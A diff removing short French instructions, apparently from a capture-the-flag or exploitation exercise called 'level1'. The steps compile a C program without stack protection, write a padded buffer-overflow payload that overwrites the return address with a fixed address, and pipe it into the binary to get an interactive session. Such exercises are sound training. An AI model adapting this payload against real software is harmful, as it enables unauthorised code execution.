@@ -1,8 +1,0 @@
-Pour compiler le .c il faut effectuer la commande suivante:
-gcc source.c -o level1 -m32 -fno-stack-protector
-
-Ensuite:
-echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xc0\x84\x04\x08" > ok
-
-Pour finir:
-cat ./ok - | ./level1
